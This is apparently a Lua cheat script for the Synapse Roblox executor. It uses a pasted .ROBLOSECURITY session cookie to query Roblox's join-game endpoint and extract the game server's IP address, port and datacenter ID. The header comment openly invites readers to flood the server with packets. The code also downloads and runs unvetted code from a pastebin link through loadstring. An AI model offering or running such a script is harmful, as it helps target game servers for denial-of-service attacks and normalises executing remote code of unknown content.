--[[

    Roblox server ip port and datacenter grabber made by sufi#1337

    I also attached the json file to see how many shit they're logging about you it's just crazy
    Have fun sending them packets

    Add a roblox COOKIE in the headers file at line 33 (https://www.youtube.com/watch?v=LqNElCpjxQU)
    
    (The roblox server is waiting packets go send!!!)

]]

local request = syn.request or request
local gameid = game.PlaceId
local jobid = game.JobId
local http = game:GetService("HttpService")
local ip
local port
local dataCenterID
local notifications = loadstring(game:HttpGet("https://pastebin.com/raw/kSLQbpjV"))()

local reqdata = {
    ['placeId'] = gameid,
    ['gameId'] = jobid,
    ['isPlayTogetherGame'] = false
}

reqdata = http:JSONEncode(reqdata)

local headers = {
    ['Content-Type'] = "application/json",
    ['Cookie'] = '.ROBLOSECURITY='..'UR ROBLOX COOKIE HERE',
    ['User-Agent'] = 'Roblox/WinInet'
}

local Payload = {Url = 'https://gamejoin.roblox.com/v1/join-game-instance', Body = reqdata, Method = "POST", Headers = headers}
local response = request(Payload)
response = response.Body
response = http:JSONDecode(response)
for i,v in pairs(response) do
    if i == 'joinScript' then
        for i1,v1 in pairs(v) do
            if i1 == 'MachineAddress' then
                ip = v1
            elseif i1 == 'ServerPort' then
                port = v1
            elseif i1 == 'DataCenterId' then
                dataCenterID = v1
            end
        end
    end
end

local msg = 'Server IP: '..ip..'\nServer Port: '..port..'\nData Center ID: '..dataCenterID

notifications.prompt('Lego Server Data\nBy sufi#1337', msg..'\nData copied to clipboard!')
setclipboard(msg)
warn(msg)
